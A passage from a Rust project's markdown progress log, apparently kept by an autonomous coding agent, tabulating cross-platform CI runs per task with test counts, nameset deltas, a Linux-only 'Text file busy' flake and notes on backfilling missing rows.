| 34974577185 | `4fd5663` — **the `P4-T003` implementation** | **all five green.** Windows **1363** / macOS **1364** / Ubuntu **1365** passed, 0 failed, 11 ignored, **51** result lines = **41 parents + 10 children**. The parent count moved **40 → 41** for the new `python_checks` binary and **+29 on every platform** against `34970543344`, which is the 15 `python::tests::*` unit tests added to `sure_core` and the 14 integration tests in the new binary. Namesets **`+29 −0`** with the identical added set on all three platforms. Detail above |
| 34976801249 | `22b518d` — **the `P4-T003` acceptance** | **all five green**, and **1363 / 1364 / 1365** with 0 failed, 11 ignored, **51** result lines = **41 parents + 10 children** on each — the row above's figures to the test, **+0 on every platform**, on a commit that touches only `progress/`. `bootstrap-validate-windows` printed `SURE bootstrap validation OK: 17 phases, 166 tasks.` and `state OK: 166 tasks`. **This row was missing**: a run is read, its reading is written as a section, and the index a reader scans is not extended — the same gap as the six rows `P2-T011`'s acceptance and the nine `P4-T003`'s found. Measured from the logs during `P4-T004`'s acceptance, not transcribed |
| 34982674189 | `c9d594f` — **the `P4-T004` implementation** | **failure: `rust (macos-latest)`.** The other four jobs green, Windows **1394** and Ubuntu **1396** passed with 0 failed. macOS **1394 passed, 1 failed**, and **exactly one failing test**: `a_service_that_is_dropped_is_stopped_anyway`. **52** result lines = **42 parents + 10 children** on each, **11 ignored**. The parent count moved **41 → 42** for the new `rust_checks` binary and **+31 on every platform** against `34976801249`, which is the 15 `rust::tests::*` unit tests, the 14 integration tests in the new binary and the 2 added to `checks::mod` — and macOS's total is +31 too, with one of them moved from the passed column to the failed one. **The failing test is not this commit's**: it is `P3-T009`'s, it failed on the one platform whose scheduler put the child between two adjacent statements, and the guard inside it is what refused to call the resulting measurement a pass. Detail below |
| 34983449923 | `702cfee` — **the `P3-T009` fix the row above forced** | **all five green.** **1394 / 1395 / 1396** passed, **0 failed**, 11 ignored, **52** result lines = **42 parents + 10 children** on each — the row above's figures with the one macOS failure back in the passed column, so **+1 on macOS and +0 on the other two**, on a commit that changes an existing test and a child helper rather than adding a test. A **nameset** diff against `34976801249` reads **+27 added, 0 removed** while the passed delta is **+31**, and the four-name gap is a limit of the instrument rather than a lost test: 4 of `rust_checks.rs`'s 14 tests carry names P4-T003's `python_checks.rs` already printed (`a_manifest_that_is_not_there_is_not_a_project_that_declares_nothing`, `every_fixture_sits_at_a_path_two_platforms_disagree_about`, `the_command_a_check_names_is_the_line_sure_would_run`, `two_independent_readings_of_one_project_give_the_same_identifiers`), and a set difference cannot see a name a second binary has in common with an older one. **The green here is not evidence about the race the row above found** — the fix removes the window the guard refused, and an idle runner would have passed the old test too |
| 34991517761 | `ed96627` — **the `P4-T005` implementation** | **failure: `rust (macos-latest)` and `rust (ubuntu-latest)`.** The other three jobs green — windows, shellcheck, and `bootstrap-validate-windows`, which printed `SURE bootstrap validation OK: 17 phases, 166 tasks.` and `state OK: 166 tasks`. Windows **1460** passed / **0** failed; macOS **1460 passed, 1 failed**; Ubuntu **1461 passed, 1 failed**; **11 ignored**, **53** result lines = **43 parents + 10 children** on each. The parent count moved **42 → 43** for the new `setup_validation` binary, and the totals moved **+66 on every platform** against `34983449923` (Windows 1394 → 1460, macOS 1395 → 1461, Ubuntu 1396 → 1462, the two failures inside the +66) — the 66 test functions this task added, counted three ways below. **The nameset delta against that run reads +65 −0 while the passed delta is +66**, and the missing name is named rather than rounded: `the_helper_that_looks_for_new_files_can_see_a_new_file` is defined in both `tests/document_commands.rs` and the new `tests/setup_validation.rs`, so a set difference sees one name where the runner counts two tests — **the instrument limit the row above records, reached from the other side**. Exactly one test failed on each red platform, the same one both times: `setup::tests::a_path_that_climbs_out_of_the_project_is_not_looked_for` at `crates/sure-core/src/setup.rs:1329`, asserting `leaves_the_project(Path::new("C:/Windows/win.ini"))`. **That is a product defect and not a bad assertion** — on Unix a drive-letter path has no `Component::Prefix`, so a Windows-only instruction in a correct README was read as a path inside the project, looked for, not found, and answered `Contradicted` on two platforms out of three — and the commit below is the fix. Detail below |
| 34995107384 | `fa35ed7` — **the cross-platform reading fix the row above forced** | **all five green.** **1462 / 1463 / 1464** passed, **0 failed**, 11 ignored, **53** result lines = **43 parents + 10 children** on each — the row above's figures with **+2 on every platform**, and both of the row above's failures back in the passed column rather than a total that moved for some other reason. **43 + 10 unchanged**, so no test binary was added, and the **nameset** delta against `34991517761` reads **+2 −0**, naming exactly the two tests the fix adds (`documents::tests::a_location_on_one_platform_is_read_the_same_way_on_all_three` and `a_windows_location_is_not_a_path_in_the_project`) — **a nameset delta that equals the passed delta**, which neither of the two rows above could produce. Windows **1462** is the same figure the local `cargo test --workspace --no-fail-fast` gives, which is a coincidence worth having rather than a check. `bootstrap-validate-windows` printed `SURE bootstrap validation OK: 17 phases, 166 tasks.` and `state OK: 166 tasks`. **Nothing in this run is evidence about the single local failure this task's mutation run saw in `a_service_that_is_dropped_is_stopped_anyway`** — that test is `P3-T009`'s, it is not reproducible in 90 runs, and it is recorded below as an open observation rather than resolved. Detail below |

| 34999750331 | `585d634` — **the `P4-T006` implementation** | **all five green.** Windows **1489** / macOS **1490** / Ubuntu **1491** passed, **0 failed**, 11 ignored, **54** result lines = **44 parents + 10 children** on each, and **Windows 1489 is the same figure the local `cargo test --workspace --no-fail-fast` gives** — a coincidence worth having rather than a check. Against `34995657368`, the run of `ee59d78` and this task's `base_sha`: **+27 passed on every platform, +1 result line, +1 parent, +0 children**, the parent moving because `env_completeness` is a new test binary and the child count not moving because it is a new *parent*. **The nameset delta against that run reads +27 −0, which equals the passed delta**, and the 27 names are exactly this task's 17 unit tests and 10 integration tests — `a_claim_is_bound_to_the_state_it_was_read_against` is defined in both files, and the collision does **not** undercount here, because the module's copy is printed qualified (`env_completeness::tests::…`) and the integration copy is not, so the set holds two spellings where the earlier undercount held one. **A nameset delta that equals the passed delta is what makes this green checkable rather than merely green.** `bootstrap-validate-windows` printed `SURE bootstrap validation OK: 17 phases, 166 tasks.` and `state OK: 166 tasks`; `shellcheck-secondary` green over its five steps. Detail below |

| 35004072122 | `576d2b0` — **the `P4-T007` implementation** | **all five green.** Windows **1523** / macOS **1524** / Ubuntu **1525** passed, **0 failed**, 11 ignored, **55** result lines = **45 parents + 10 children** on each, and **Windows 1523 is the same figure the local `cargo test --workspace --no-fail-fast` gives**. Against `35000344864`, the run of `0151ff4` and this task's `base_sha`: **+34 passed on every platform, +1 result line, +1 parent, +0 children**, the parent moving because `db_migrations` is a new test binary and the child count not moving because it is a new *parent*. **The nameset delta against that run reads +34 −0 on all three platforms, which equals the passed delta**, and the 34 names are exactly this task's 24 unit tests and 10 integration tests — the two `this_platform_reads_a_differently_cased_…` tests differ between the module and the integration file (`…name_as_the_same_name` against `…schema_as_the_same_file`), so no name is defined twice and the delta is not undercounted. **A nameset delta that equals the passed delta is what makes this green checkable rather than merely green.** `bootstrap-validate-windows` printed `SURE bootstrap validation OK: 17 phases, 166 tasks.` and `state OK: 166 tasks`; `shellcheck-secondary` green. Detail below |

| 35046550608 | `23d7ae8` — **the `P4-T008` implementation** | **all five green.** Windows **1540** / macOS **1541** / Ubuntu **1542** passed, **0 failed**, 11 ignored, **56** result lines = **46 parents + 10 children** on each, and **Windows 1540 is the same figure the local `cargo test --workspace --no-fail-fast` gives**. Against `35043954360`, the run of `928920b` and this task's `base_sha`: **+17 passed on every platform, +1 result line, +1 parent, +0 children**, the parent moving because `dependency_state` is a new test binary and the child count not moving because it is a new *parent*. **The nameset delta against that run reads +17 −0 on all three platforms, which equals the passed delta**, and the 17 names are exactly this task's **5** unit tests and **12** integration tests — the module's five are printed qualified (`dependency_state::tests::only_an_observed_absence_reads_as_something_other_than_the_code` and its four siblings), so no name is defined twice and the delta is not undercounted. **A nameset delta that equals the passed delta is what makes this green checkable rather than merely green.** `bootstrap-validate-windows` printed `SURE bootstrap validation OK: 17 phases, 166 tasks.` and `state OK: 166 tasks`; `shellcheck-secondary` green. **The implementation commit is green on its first push, and the one failure this task produced was local and was a guard working correctly** — `check_schedule`'s proposer rule refused a unit test that named `ExecutionRequirements`, which is why that test was deleted rather than exempted. Detail in *What `P4-T008` added*, above |

| 35047367329 | `a931cb7` — **the `P4-T008` acceptance** | **all five green.** Windows **1540** / macOS **1541** / Ubuntu **1542** passed, **0 failed**, 11 ignored, **56** result lines = **46 parents + 10 children** on each — **identical to `35046550608` in every one of those figures**, which is the right reading for a commit that touches only `progress/`, and it is read out of the log rather than assumed from the commit's file list. `bootstrap-validate-windows` printed `SURE bootstrap validation OK: 17 phases, 166 tasks.` and `state OK: 166 tasks`; `shellcheck-secondary` green. **This row was added at `P4-T009`'s acceptance because it was recorded nowhere**: the run of a commit that *records* runs cannot be written into the commit that records them, and `P4-T008`'s acceptance section described the implementation's run instead. It is the same shape of gap as the six `P2` runs above, arriving the same way, and it was found this time by listing the runs on this branch rather than by someone noticing. Detail under *What `P4-T008` added* |

| 35050752542 | `d379103` — **the `P4-T009` implementation** | **all five green.** Windows **1566** / macOS **1567** / Ubuntu **1568** passed, **0 failed**, 11 ignored, **57** result lines = **47 parents + 10 children** on each, and **Windows 1566 is the same figure the local `cargo test --workspace --no-fail-fast` gives**. Against `35046550608`, the run of `23d7ae8` and this task's `base_sha`: **+26 passed on every platform, +1 result line, +1 parent, +0 children**, the parent moving because `aggregation` is a new test binary and the child count not moving because it is a new *parent*. **The nameset delta against that run reads +26 −0 on all three platforms, which equals the passed delta**, and the 26 names are exactly this task's **11** unit tests and **15** integration tests — the module's eleven are printed qualified (`aggregation::tests::…`), so no name is defined twice and the delta is not undercounted. **A nameset delta that equals the passed delta is what makes this green checkable rather than merely green.** `bootstrap-validate-windows` printed `SURE bootstrap validation OK: 17 phases, 166 tasks.` and `state OK: 166 tasks`; `shellcheck-secondary` green. **The implementation commit is green on its first push, and the only failures this task produced were the two mutation survivors** — `m14` and `m24`, both closed by tests written for them, with the set then re-run in full. Detail in *What `P4-T009` added*, above |

| 35051377226 | `fc1b862` — **the `P4-T009` acceptance** | **all five green.** Windows **1566** / macOS **1567** / Ubuntu **1568** passed, **0 failed**, 11 ignored, **57** result lines = **47 parents + 10 children** on each — **identical to `35050752542` in every one of those figures**, which is the right reading for a commit that touches only `progress/`, and it is read out of the log rather than assumed from the commit's file list. `bootstrap-validate-windows` printed `SURE bootstrap validation OK: 17 phases, 166 tasks.` and `state OK: 166 tasks`; `shellcheck-secondary` green. **This row was added at `P5-T001`'s acceptance because the run was recorded nowhere**: the run of a commit that *records* runs cannot be written into the commit that records them, and `P4-T009`'s acceptance section described the implementation's run instead — the same shape of gap as the six `P2` runs above, arriving the same way |

| 35054249354 | `c9057d7` — **the `P5-T001` implementation** | **all five green.** Windows **1595** / macOS **1596** / Ubuntu **1597** passed, **0 failed**, 11 ignored, **58** result lines = **48 parents + 10 children** on each, and **Windows 1595 is the same figure the local `cargo test --workspace --no-fail-fast` gives**. Against `35051377226`, the run of `fc1b862` and this task's `base_sha`: **+29 passed on every platform, +1 result line, +1 parent, +0 children**, the parent moving because `runtime_probes` is a new test binary and the child count not moving because it is a new *parent*. **The nameset delta against that run reads +29 −0 on all three platforms, which equals the passed delta**, and the 29 names are exactly this task's **14** unit tests and **15** integration tests — the module's fourteen are printed qualified (`runtime_probes::tests::…`), so no name is defined twice and the delta is not undercounted. **A nameset delta that equals the passed delta is what makes this green checkable rather than merely green.** `bootstrap-validate-windows` printed `SURE bootstrap validation OK: 17 phases, 166 tasks.` and `state OK: 166 tasks`; `shellcheck-secondary` green. **The implementation commit is green on its first push, and the two mutation survivors the first run found are `m20` and `m25`** — the plan's own line order, and the four sentences a gap can show — both closed by tests written for them. Detail in *What `P5-T001` added*, above |

| 35056098080 | `3cabc96` — **the `P5-T001` acceptance** | **all five green.** Windows **1595** / macOS **1596** / Ubuntu **1597** passed, **0 failed**, 11 ignored, **58** result lines = **48 parents + 10 children** on each — **every figure identical to the implementation row above it, which is the shape an acceptance commit has to have**: it changes `progress/` and nothing else, so a number that moved would be the acceptance's fault and not the suite's. Against `35054249354`, the run of `c9057d7` and this task's `base_sha`: **+0 passed, +0 result lines, +0 parents, +0 children on all three platforms**, and **the nameset delta against that run reads +0 −0 on all three**, which is what makes *the acceptance changed nothing the tests can see* a measurement rather than a claim. **This is the run where the platform-drift reading was noticed**: its pairwise sets are `windows vs macos: −13 +14` and `windows vs ubuntu: −14 +16`, and the `−12 +14` recorded against `P3-T006`'s rows was high by two names. `bootstrap-validate-windows` printed `SURE bootstrap validation OK: 17 phases, 166 tasks.` and `state OK: 166 tasks`; `shellcheck-secondary` green. **This row is a backfill**: the run is of `P5-T001`'s acceptance commit and its log is read here rather than in the session that pushed it, which is the rule this table keeps |

| 35063118526 | `ee050da` — **the `P5-T002` implementation** | **all five green.** Windows **1618** / macOS **1619** / Ubuntu **1620** passed, **0 failed**, 12 ignored, **59** result lines = **49 parents + 10 children** on each. Against `35056098080`, the run of `3cabc96` and this task's `base_sha`: **+23 passed on every platform, +1 result line, +1 parent, +0 children**, the parent moving because `tests/runtime_start.rs` is a new test binary and the child count not moving because it is a new *parent*; the ignored count moves 11 → 12 because the new integration file carries one `#[ignore]`d child entry point that the smoke tests start by name. **The nameset delta against that run reads +24 −1 on all three platforms**: the new tests are **10** `runtime_start::tests::` unit tests, **12** runnable integration tests and **1** new `spawn_sites` test, and the **−1** is a rename — `nothing_outside_the_supervisor_names_a_supervisor` out, `nothing_outside_the_named_files_names_a_supervisor` in — which is the fourth census rule moving the third rule's exemption list from one file to two. **The arithmetic closes rather than approximately closing**: 23 new runnable names plus the one ignored name is 24 test functions, and **+23 passed and +1 ignored is exactly what the result lines report**. The pairwise readings are unchanged from the run above. `bootstrap-validate-windows` printed `SURE bootstrap validation OK: 17 phases, 166 tasks.` and `state OK: 166 tasks`; `shellcheck-secondary` green. **The implementation is green on its first push. This is not the tree the task is accepted on**: a push review named this module and reading its security surface found the service's own output being quoted unescaped, so `0b72dce` follows it and is the row below |

| 35064050013 | `0b72dce` — **the `P5-T002` escaping fix** | **all five green.** Windows **1619** / macOS **1620** / Ubuntu **1621** passed, **0 failed**, 12 ignored, **59** result lines = **49 parents + 10 children** on each — **+1 passed on every platform against the row above and nothing else moved**, which is the shape a one-test fix has to have, and **Windows 1619 is the same figure the local `cargo test --workspace --no-fail-fast` gives**. **The nameset delta against `35063118526` reads +1 −0 on all three platforms**, and the one name it adds is `runtime_start::tests::a_service_cannot_write_an_escape_into_the_line_sure_prints` — so the run's extra pass is the test that was added and not something else that began passing quietly, which a bare count would not have told apart. The pairwise readings are unchanged again (`−13 +14` against macOS, `−14 +16` against Ubuntu), as they must be for a change with no platform-gated name in it. `bootstrap-validate-windows` printed `SURE bootstrap validation OK: 17 phases, 166 tasks.` and `state OK: 166 tasks`; `shellcheck-secondary` green. **This is the tree `P5-T002` is accepted on**, and the mutation set's log against it — not the log against `ee050da`, which measures a tree that no longer exists — is what the acceptance cites |

| 35067317216 | `14ca785` — **the `P5-T002` acceptance** | **all five green.** Windows **1619** / macOS **1620** / Ubuntu **1621** passed, **0 failed**, 12 ignored, **59** result lines = **49 parents + 10 children** on each — **every one of those figures identical to `35064050013`, the run of `0b72dce` and this task's `base_sha`**, which is the shape an acceptance commit has to have: it changes `progress/` and nothing else, so a number that moved would be the acceptance's fault and not the suite's. The reading is the same one the row above records, and the parents/children split is derived the same way — **45 `Running` lines plus 4 `Doc-tests` lines are the 49 parents**, and the ten children are the ten consecutive `test result:` lines a reader finds with no `Running` line between them (nine of them `1 passed`, and `6 passed; 1 ignored` for the one that starts the multi-test child entry point), which is what makes the split a measurement rather than a convention carried forward. `bootstrap-validate-windows` printed `SURE bootstrap validation OK: 17 phases, 166 tasks.` and `state OK: 166 tasks`; `shellcheck-secondary` green. **This row is a backfill**, and it is the case the table's own rule names: the run of the commit that *records* runs cannot be written into the commit that records them, so `P5-T002`'s acceptance section described the implementation's run and the escaping fix's run, and the acceptance's own run is read here — at `P5-T003`'s acceptance, in the session that pushed it, from `gh run view --log` rather than from the job colours |

| 35086572733 | `e5d5b06` — **the `P5-T003` implementation and its tests** | **all five green, and only on the second attempt — the first attempt is recorded here rather than erased.** Windows **1643** / macOS **1644** / Ubuntu **1645** passed, **0 failed**, 12 ignored, **60** result lines = **50 parents + 10 children** on each — **+24 passed on every platform against `35067317216`, the row above, and nothing else moved**, which is the shape a task's first commit has to have. The nameset delta against that row reads **+24 −0 on Windows**, and the twenty-four names are exactly this task's own: the twelve `http_routes::tests::` unit tests and the twelve `tests/http_routes.rs` integration tests — so the run's extra passes are the tests that were added and not something else that began passing quietly, which a bare count would not have told apart. The parents/children split moved with them: **46 `Running` lines plus 4 `Doc-tests` lines are the 50 parents**, where the row above has 45, so the +1 parent is `tests/http_routes.rs` arriving as a test binary of its own, and **the twelve inside `sure-core`'s own lib result line — 796 to 808 — are the twelve unit tests**. The pairwise readings are **unchanged** (`−13 +14` against macOS, `−14 +16` against Ubuntu) and **not one of the thirty platform-gated names is a route name**, which is what a change with nothing platform-specific in it must read as. `bootstrap-validate-windows` printed `SURE bootstrap validation OK: 17 phases, 166 tasks.` and `state OK: 166 tasks`; `shellcheck-secondary` green. **The first attempt of this run was red on Ubuntu, and that is the part of this row worth reading.** `rust (windows-latest)` and `rust (macos-latest)` were green in it; Ubuntu failed `a_service_that_outlives_the_window_and_then_ends_is_still_a_failure` and `a_service_that_is_dropped_is_stopped_anyway` with **`Text file busy (os error 26)`** — the spawn refusing a program that a *concurrent* `fs::copy` still had open for writing. **Neither file is touched by `e5d5b06`, neither test is this task's, and the re-run of that one job came back green**, so what the attempt found is a pre-existing Linux-only race in another task's fixtures rather than a defect in this commit — its mechanism, its evidence and the reason it is recorded rather than fixed inside this task are in the section below. **The run id is the same run**: `gh run rerun --failed` re-runs a job inside a run and does not mint a second one, which is exactly why the failure had to be written down here instead of being left to the run's own state, where a green re-run replaces it |

| 35087849335 | `c4ec1ac` — **the `P5-T003` acceptance, progress files and nothing else** | **red on Ubuntu, and the redness cannot be this commit's** — `rust (windows-latest)`, `rust (macos-latest)`, `bootstrap-validate-windows` and `shellcheck-secondary` are all `success`, and `rust (ubuntu-latest)` failed exactly one test: `a_service_that_comes_up_and_answers_is_a_pass_that_quotes_the_exchange` in `crates/sure-core/tests/runtime_start.rs`, at line 936, with `left: Error` against `right: Pass` and **`Text file busy (os error 26)`** in SURE's own sentence about the program it could not start. **This commit changes three files, all of them under `progress/`, and `cargo test` does not compile them** — so the failure is a property of the tree it inherits and not of anything it did, which is why it is recorded here rather than fixed by a revert of something. **It is the second consecutive run to fail this way and it is a different test**: `35086572733`'s first attempt failed `a_service_that_outlives_the_window_and_then_ends_is_still_a_failure` and `service_supervisor.rs::a_service_that_is_dropped_is_stopped_anyway`, and this one fails `comes-up-and-answers` — **four distinct tests in three files across two runs, every one of them the same errno from a file the test itself had just copied and was about to execute**. The eight runs before `e5d5b06` contain **zero** occurrences of `Text file busy`, so the correlation with the commit that added `tests/http_routes.rs` and its twelve tests is real and the **causation is not established** — a rare race seen twice in a row is weak evidence, and the honest reading is that this branch now has a Linux-only flake whose failure rate is unknown and whose mechanism is derived rather than reproduced. The reasoning, the evidence and the falsifier are in the section below, which this row does not replace. |

**The pairwise readings in this table are not all the same number, and the ones
that moved did so for a reason rather than drifting.** Every row from `P3-T006`'s
until `35050752542` reads `windows vs ubuntu: −12 +14` and `windows vs macos: −13
+14`. From `35051377226` on, the Ubuntu figure is `−14 +16` while the macOS figure
has not moved at all. **Both** numbers in the Ubuntu reading moved, by two, and
the four names behind that are `P4-T007`'s: that task added a case-sensitivity
pair whose two halves are gated to different platforms — one spelling asserted on
the case-sensitive platform and its twin on the folding ones — so Ubuntu runs

`db_migrations::tests::this_platform_reads_a_differently_cased_name_as_a_different_name`
`db_migrations::tests::this_platform_reads_a_differently_cased_schema_as_a_different_file`

and neither folding half, while Windows and macOS run
`this_platform_reads_a_differently_cased_name_as_the_same_name` and
`this_platform_reads_a_differently_cased_schema_as_the_same_file` and neither
Linux half. Neither of the new Ubuntu names is new to the other two platforms,
which is why the Windows/macOS reading does not move: both folding halves run on
both of those platforms, so they differ from Windows on neither. **A count that
moves by exactly the number of names the commit added, on the one platform whose
gating changed and not at all on the other two, is the signature of a
platform-gated test pair rather than of a suite that lost or gained tests**, and
the attribution is measured rather than assumed: a grep for `differently_cased`
over the three logs returns **zero** names at `702cfee` and two on each platform
at `ee050da`, four distinct names across the three; `git log -S` names `576d2b0`
for the two Linux spellings and names `576d2b0` **and** `928920b` for the two
folding ones; `702cfee` is an ancestor of `576d2b0` and `576d2b0` is an ancestor
of `ee050da`; and those are exactly the two `P4-T007` commits among the fifteen in
the range that has no logs on disk. The reading was noticed at `3cabc96` and is
recorded here rather than left standing against the older rows, which were true
when they were written and are not true of the suite that runs now.
`pairwise-drift.py` reproduces the walk: `12 14` holds from `b0dcc69` through
`702cfee` and reads `14 16` at `ee050da`, the first commit after the gap that has
all three logs on disk.

**Six runs were missing from this table when `P2-T011` was accepted, and they are
added above: `P2-T010`'s acceptance, and every commit of `P2-T008`'s and
`P2-T009`'s.** The table's last row was `P2-T012`'s implementation, so the three
tasks accepted after it each got a prose section below and no row here — the same
gap as the two `P2-T002` runs, arriving the same way: a run is read, the reading
is written as a section, and the index a reader actually scans is not extended.
**The rows were read out of the logs before being written**, not copied from the
implementation rows they follow: all four acceptance runs were downloaded and
parsed per job, which is why they say "unchanged from the row above" as a measured
result rather than an expectation. The check that the table is complete is
`gh run list --branch claude/v0.1-autonomous` set against it, and that check had
never been run.

**The last two of the `P2-T002` runs above were missing from this table and are
added with `P2-T003`'s.** They were green and went unrecorded, which is the same
shape of gap this section exists to name — a run nobody opened is a run nobody
can describe, and "it was green" written from memory is exactly what the red
acceptance commit was written from.

**Three more rows were missing when `P3-T002` was accepted — `408b821`,
`819d499` and `8955a69` — and the shape of the gap is now worth stating exactly,
because it is not the same one.** The section above the table was written for
`34924525793` and the acceptance entry below names both runs, so neither run was
*unread*; both were read, described in prose, and never added to the index a
reader scans. That is a **third** distinct way for this table to be wrong,
alongside the two already recorded: a run read and committed as prose with no row
(a reader of the table sees a table that ends early, which reads exactly like a
table that is complete), and a run written into the table from memory without
being opened. The check is the same one in all three cases —
`gh run list --branch claude/v0.1-autonomous` set against the table — and it has
now been run twice and found a gap twice. **All three rows were read out of the
downloaded logs before being written**, with the occurrence method recorded below,
and the two `P3-T001` rows are identical figure for figure, which is what a
documentation-only commit should produce.

**Three more rows were missing when `P3-T003` was accepted — `b8ecd50`,
`3be88f1` and `601c171` — and this is the third time the check has found a gap.**
The check is the same one every time, `gh run list --branch claude/v0.1-autonomous`
set against the table, and it has now been run three times and found a gap three
times. The three are two chains' own record commits (`b8ecd50` records `P2-T006`'s
last run in its subject line; `3be88f1` records the `P2-T007` fix's) and
`P3-T002`'s acceptance, which was read in its session and written into "Next
concrete action" rather than into this index. **All three were downloaded and
parsed before their rows were written**, and each came back identical to the row
above it, which is what a documentation-only commit should produce — that is a
measurement here and not an expectation, and it is the only reason the phrase
"identical to the row above" is allowed in this table.

**The pattern in three readings is now clear enough to state as a rule, and it is
not "remember to add the row".** Every gap has been a commit whose run was read
*and described somewhere else* — in a prose section, in a commit message, in
"Next concrete action" — with the index left alone, because writing the prose
feels like finishing the job. The check that catches it is mechanical and costs
one command, which is why it is written here rather than trusted to attention: the
table is an index, and an index nobody sets against its source is a reading of the
source it was written from.

**Twenty rows were missing when `P3-T010` was accepted, and the fourth gap breaks
the rule the paragraph above just stated.** Twenty runs — every run from
`P3-T004`'s acceptance to `P3-T010`'s fix — were absent, and **two of them,
`34936301857` and `34940207615`, were not named anywhere in this file at all**,
so no reading of any kind existed for them. The rule above says the shape is "a
run whose reading was written somewhere else"; that covers eighteen of the
twenty, and **it does not cover the two that were never read**. So the rule is
amended rather than repeated: *every run on the branch gets a row, and a run
gets a reading because the row is owed rather than because prose has already been
written about it.*

**The reason is in the arithmetic, and it is why the check has to be mechanical.**
The check was run at `P2-T011`, `P3-T002` and `P3-T003` and found three rows each
time; the table's last row was written at `P3-T004`. **The check stopped being run
at exactly the point where it would have found the biggest gap**, because it is a
command a person has to remember, and it had by then found a gap three times
running — which is when a check stops feeling like a discovery and starts feeling
like a chore. The three earlier paragraphs are each a paragraph; this one is
twenty rows, and twenty rows is what "remember to run it" costs.

**All twenty were downloaded and parsed per job before their rows were written**,
with `target/tmp/backfill.py`, which fetches a run, splits it into one log per job
the way `splitjobs.py` does, and hands the three to `read-run.py` — so the figures
in the rows above are read out of the logs rather than copied from the prose
sections that describe eighteen of these runs. The rows also carry what the
sections never did: **the per-platform deltas**, which is how the two commits of
`P3-T010` read as `+23 on every platform` and `+1 on every platform` respectively.

**Twenty-nine consecutive rows of this table report a different quantity from the
rows after them, and until `P4-T003`'s acceptance nothing said so.** `read-run.py`
prints two pass totals, and they are not the same number:

- **`passed`** — the sum over every `test result:` line in the job, parent binaries
  and their children together. This is what the rows from `34935781639` (`967c5e6`,
  the `P3-T004` implementation) onward state.
- **`parent_passed`** — the same sum over the parent binaries only, excluding the
  child lines. This is what the twenty-nine rows from `34854388756` (`e10f620`,
  the `P2-T005` implementation) to `34930744061` (`ea2f826`, the `P3-T003` fix)
  state. Two rows inside that range, `34862387972` and `34865716315`, state no
  pass total at all, which is why the range holds thirty-one rows and the count is
  twenty-nine.

**Every one of those twenty-nine was re-measured out of its own downloaded log in
this session, and every one matches the `parent_passed` column exactly** — so this
is one convention that changed, not twenty-nine transcriptions that drifted, and
the distinction is worth the paragraph because the two would need different
repairs. The gap between them is the child count the same rows already print: on
`e10f620` the row says "34 result lines = 24 parents + 10 children" and reports
`786`, which covers 24 of the 34 lines it just named, with the 10 doc-test children
unaccounted for. A reader comparing `786` at `e10f620` with `1126` at `967c5e6`
sees a jump of 340 where the real growth is 330.

**The figures were left as read.** They are true of the quantity they measure, and
rewriting twenty-nine accepted rows into a different definition would replace a
labelled inconsistency with an unlabelled one — the numbers would then agree with
each other and nothing would record that they had ever been read differently. What
was missing was the label, so the label is what is added. **To convert any row in
the block, add its own `children` column to its stated figure**, which is a
correction a reader can make from the row alone.

**The check that found this is `target/tmp/rowsweep.py`, and it was wrong twice
before it was right, both times in the same direction.** The first version asked
whether a row contained its run's `passed` triple as three consecutive numbers, and
flagged `34952200942` and `34956776646`; both write the figures out of platform
order ("Windows **1227** and Ubuntu **1229** passed ... macOS **1227 passed, 1
failed**") and both are correct, so the check reported two good rows as broken. The
correction was to match the table's stated shape first and fall back to a loose
scan — and that version was wrong the other way: the `ea2f826` row now quotes both
totals so the correction above can be read, and a scan that looks for its run's
figures anywhere in the text finds the quotation and calls the row right. It
reported **28** where there are **29**. That is the same failure as the log
tables this file keeps recording, arriving this time inside the checker: an answer
about the row the check expected rather than the row it was given. The version in
the tree matches the stated figures as a shape, reports a row that states neither
column separately from one it cannot read at all, and reports **29 / 0 / 15 / 16**
— twenty-nine stating the other column, none stating a triple belonging to no
column, fifteen stating the right figures in the narrative form the shape pattern
does not cover, and sixteen stating no figures, which is where the two out-of-order
rows land and where they were confirmed by hand.

### Reading run `34974577185`, `P4-T003`'s

**All five jobs green**: `bootstrap-validate-windows`, `rust (windows-latest)`,
`rust (macos-latest)`, `rust (ubuntu-latest)`, `shellcheck-secondary`.

| platform | result lines | passed | failed | ignored |
| --- | --- | --- | --- | --- |
| Windows | 51 | **1363** | 0 | 11 |
| macOS | 51 | **1364** | 0 | 11 |
| Ubuntu | 51 | **1365** | 0 | 11 |

**The baseline is `34970543344`**, the `P4-T002` acceptance carrying `424b213`,
and the delta is **`+29` on every platform** — 1334 / 1335 / 1336 → 1363 / 1364 /
1365 — with the result-line count going **50 → 51 on all three**, the extra line
being the new `python_checks` binary and nothing else changing shape. The one- and
two-test gaps between the platforms are the same gaps every recent run has had, so
they are pre-existing.

**Local Windows agrees with CI Windows to the test.** The local
`cargo test --workspace --no-fail-fast` on the same commit reports 51 result
lines, **1363 passed, 0 failed, 11 ignored** — the same three numbers CI Windows
reports.

**The Windows per-name table, against the same baseline:**

| name | before | after | delta |
| --- | --- | --- | --- |
| `sure_core` | 654 | 669 | **+15** |
| `python_checks` | 0 | 14 | **+14** |
| the other 35 names (38 of the 40 baseline target lines) | — | — | **+0** |
| **TOTAL** | **1334** | **1363** | **+29** |

**15 + 14 = 29, and the decomposition agrees with the local one arrived at from
the other side.** Locally the same `+29` was read off the source as fifteen
`checks::python` unit tests in `sure_core`'s lib and fourteen tests in the new
`python_checks` integration binary. The CI table gets there by counting binaries;
the two derivations share no step and agree on both parts, which is what gives the
`+0` on the other thirty-five names its force.

**This table is produced by the same parser as the `P4-T002` one, and that is
checked rather than asserted**: re-run over that task's own pair
(`34964462368` → `34969139607`) it prints `sure_core 636 → 654 (+18)`,
`node_checks 0 → 9 (+9)`, `check_schedule 9 → 10 (+1)`, total `1306 → 1334` — the
same three row values, the same totals and the same `654` that section settled on
— so the two tables are comparable rather than merely adjacent.

**One difference in the `other N` rows is in the counting, not in the
population.** The `P4-T002` table's other-names row reads `36`, which is its
baseline's **39 target lines minus its 3 changed rows**; the run it describes has
**36 distinct names**, of which 3 changed, so the same finding under a name
reading is 33. This table says `35` — its baseline's 37 distinct names minus its
2 changed rows — and gives the line count beside it so that a reader comparing the
two rows can see they are counting different things. Nothing vanished: the name
population went 35 → 36 → 36 → 37 across the last four runs, the two additions
being `node_checks` and `python_checks`.

**The mutation set for this task is seventeen mutations over the three files it
touches, and all seventeen were caught.** None survived and none was
`INCONCLUSIVE`. Two of them — `m10` and `m11` — restore the defect the task's own
refactor deleted, an install step whose anchor and sentence were computed by a
lookup with an unreachable fallback rather than carried from the finding that
decided them. `m10` is caught by four tests; **`m11` is caught by exactly one**,
`the_install_step_names_the_file_that_decided_and_says_what_that_file_is`, which
